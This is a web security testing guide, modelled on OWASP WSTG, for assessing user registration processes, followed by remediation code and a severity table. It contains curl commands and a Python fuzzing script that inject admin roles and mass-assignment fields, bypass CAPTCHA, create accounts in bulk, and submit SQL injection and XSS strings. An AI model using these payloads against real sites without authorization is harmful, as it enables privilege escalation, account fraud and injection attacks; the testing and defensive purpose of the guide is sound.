# WSTG-IDNT-02: Test User Registration Process

## Test ID
WSTG-IDNT-02

## Test Name
Test User Registration Process

## High-Level Description

The user registration process is a critical security boundary where new identities are created in the system. Testing this process identifies vulnerabilities such as weak identity verification, insufficient validation, mass registration vulnerabilities, and privilege escalation during account creation. A flawed registration process can lead to account fraud, spam, and unauthorized access.

---

## What to Check

### Registration Security Controls

- [ ] Identity verification requirements
- [ ] Email/phone verification
- [ ] CAPTCHA implementation
- [ ] Rate limiting on registration
- [ ] Input validation
- [ ] Duplicate account prevention

### Potential Vulnerabilities

| Vulnerability | Description |
|---------------|-------------|
| Weak verification | Easy to bypass identity checks |
| No rate limiting | Mass account creation possible |
| Parameter tampering | Role injection during registration |
| Email verification bypass | Access without confirmation |
| Information disclosure | Username enumeration |

---

## How to Test

### Step 1: Analyze Registration Form

```bash
# Capture registration request
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "testuser",
        "email": "test@example.com",
        "password": "TestPass123!"
    }' -v

# Note all parameters accepted
# Look for hidden parameters in HTML source
curl -s "https://target.com/register" | grep -i "input\|name="
```

### Step 2: Test Parameter Injection

```bash
# Try adding role/admin parameters
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "attacker",
        "email": "attacker@test.com",
        "password": "TestPass123!",
        "role": "admin"
    }'

# Try isAdmin flag
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "attacker",
        "email": "attacker@test.com",
        "password": "TestPass123!",
        "isAdmin": true,
        "admin": 1,
        "usertype": "administrator"
    }'

# Try array injection
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "attacker",
        "email": "attacker@test.com",
        "password": "TestPass123!",
        "roles": ["user", "admin"]
    }'
```

### Step 3: Test Email Verification Bypass

```bash
# Register and check if immediately accessible
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "unverified",
        "email": "unverified@test.com",
        "password": "TestPass123!"
    }'

# Try logging in before verification
curl -s -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{
        "email": "unverified@test.com",
        "password": "TestPass123!"
    }'

# Try accessing protected resources
curl -s -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
    "https://target.com/api/user/profile"
```

### Step 4: Test Rate Limiting

```bash
#!/bin/bash
# Mass registration attempt

for i in {1..100}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "https://target.com/api/register" \
        -H "Content-Type: application/json" \
        -d "{
            \"username\": \"testuser$i\",
            \"email\": \"test$i@example.com\",
            \"password\": \"TestPass123!\"
        }")
    echo "Attempt $i: $response"

    if [ "$response" == "429" ]; then
        echo "Rate limited after $i attempts"
        break
    fi
done
```

### Step 5: Test CAPTCHA Bypass

```bash
# Submit without CAPTCHA
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "nocaptcha",
        "email": "nocaptcha@test.com",
        "password": "TestPass123!"
    }'

# Submit with empty CAPTCHA
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "emptycaptcha",
        "email": "emptycaptcha@test.com",
        "password": "TestPass123!",
        "captcha": ""
    }'

# Reuse old CAPTCHA token
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "oldcaptcha",
        "email": "oldcaptcha@test.com",
        "password": "TestPass123!",
        "captcha": "PREVIOUSLY_USED_TOKEN"
    }'
```

### Step 6: Test Input Validation

```bash
# SQL injection in username
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "admin'\''--",
        "email": "sqli@test.com",
        "password": "TestPass123!"
    }'

# XSS in profile fields
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "<script>alert(1)</script>",
        "email": "xss@test.com",
        "password": "TestPass123!",
        "name": "<img src=x onerror=alert(1)>"
    }'

# Email format bypass
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "bademail",
        "email": "test@test@test.com",
        "password": "TestPass123!"
    }'
```

### Step 7: Test Duplicate Account Prevention

```bash
# Register same username
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "existinguser",
        "email": "new@test.com",
        "password": "TestPass123!"
    }'

# Register same email with different username
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "newuser",
        "email": "existing@company.com",
        "password": "TestPass123!"
    }'

# Case variation
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "ExistingUser",
        "email": "EXISTING@company.com",
        "password": "TestPass123!"
    }'
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request interception | Modify registration parameters |
| **curl** | Command-line HTTP | Scripted testing |
| **Postman** | API testing | Collection-based tests |

### Automated Testing

| Tool | Description |
|------|-------------|
| **Burp Intruder** | Fuzzing registration fields |
| **OWASP ZAP** | Automated scanning |
| **Nuclei** | Template-based testing |

---

## Example Commands/Payloads

### Parameter Injection Payloads

```json
// Role escalation attempts
{"role": "admin"}
{"role": "administrator"}
{"isAdmin": true}
{"admin": 1}
{"userType": "admin"}
{"accessLevel": 9999}
{"permissions": ["admin", "superuser"]}
{"group": "administrators"}

// Mass assignment payloads
{"verified": true}
{"email_verified": true}
{"active": true}
{"approved": true}
{"credits": 99999}
{"balance": 99999}
```

### Registration Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import json

target = "https://target.com/api/register"

# Base registration data
base_data = {
    "username": "fuzztest",
    "email": "fuzz@test.com",
    "password": "TestPass123!"
}

# Additional parameters to test
fuzz_params = [
    {"role": "admin"},
    {"isAdmin": True},
    {"admin": 1},
    {"userType": "administrator"},
    {"verified": True},
    {"permissions": ["admin"]},
    {"accessLevel": 999},
]

for param in fuzz_params:
    test_data = {**base_data, **param}
    test_data["username"] = f"fuzz_{list(param.keys())[0]}"
    test_data["email"] = f"fuzz_{list(param.keys())[0]}@test.com"

    response = requests.post(target, json=test_data)
    print(f"Testing {param}: {response.status_code}")

    if response.status_code == 200:
        print(f"  [!] Accepted with extra param: {param}")
        print(f"  Response: {response.text[:200]}")
```

---

## Remediation Guide

### 1. Strict Parameter Whitelisting

```python
# Python/Flask example
from flask import request, jsonify

ALLOWED_REGISTRATION_FIELDS = {'username', 'email', 'password', 'name'}

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()

    # Only accept whitelisted fields
    clean_data = {k: v for k, v in data.items()
                  if k in ALLOWED_REGISTRATION_FIELDS}

    # Validate each field
    if not validate_username(clean_data.get('username')):
        return jsonify({'error': 'Invalid username'}), 400

    if not validate_email(clean_data.get('email')):
        return jsonify({'error': 'Invalid email'}), 400

    # Create user with default role
    user = create_user(
        username=clean_data['username'],
        email=clean_data['email'],
        password=hash_password(clean_data['password']),
        role='user',  # Always set default role
        verified=False  # Always require verification
    )

    send_verification_email(user)
    return jsonify({'message': 'Please verify your email'}), 201
```

### 2. Email Verification Enforcement

```python
# Require email verification before access
@app.route('/api/protected')
@login_required
def protected_resource():
    if not current_user.email_verified:
        return jsonify({'error': 'Please verify your email first'}), 403
    return jsonify({'data': 'Protected content'})
```

### 3. Rate Limiting Implementation

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/register', methods=['POST'])
@limiter.limit("5 per hour")  # 5 registrations per IP per hour
def register():
    # Registration logic
    pass
```

### 4. CAPTCHA Implementation

```python
import requests

def verify_captcha(captcha_response):
    response = requests.post(
        'https://www.google.com/recaptcha/api/siteverify',
        data={
            'secret': RECAPTCHA_SECRET,
            'response': captcha_response
        }
    )
    return response.json().get('success', False)

@app.route('/api/register', methods=['POST'])
def register():
    if not verify_captcha(request.json.get('captcha')):
        return jsonify({'error': 'Invalid CAPTCHA'}), 400
    # Continue registration
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Role injection during registration | 9.8 | Critical |
| Email verification bypass | 7.5 | High |
| No rate limiting | 5.3 | Medium |
| CAPTCHA bypass | 5.3 | Medium |
| Weak input validation | 6.1 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-287** | Improper Authentication | Weak identity verification |
| **CWE-269** | Improper Privilege Management | Role injection |
| **CWE-770** | Allocation Without Limits | No rate limiting |
| **CWE-20** | Improper Input Validation | Insufficient validation |

---

## References

- [OWASP WSTG - Test User Registration Process](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process)
- [OWASP Testing Guide - Identity Management](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

## Checklist

```
[ ] Registration form analyzed
[ ] All parameters documented
[ ] Role/privilege injection tested
[ ] Email verification bypass tested
[ ] Rate limiting verified
[ ] CAPTCHA implementation tested
[ ] Input validation tested
[ ] Duplicate prevention tested
[ ] Case sensitivity checked
[ ] Mass assignment tested
[ ] Information disclosure checked
[ ] Remediation recommendations provided
```
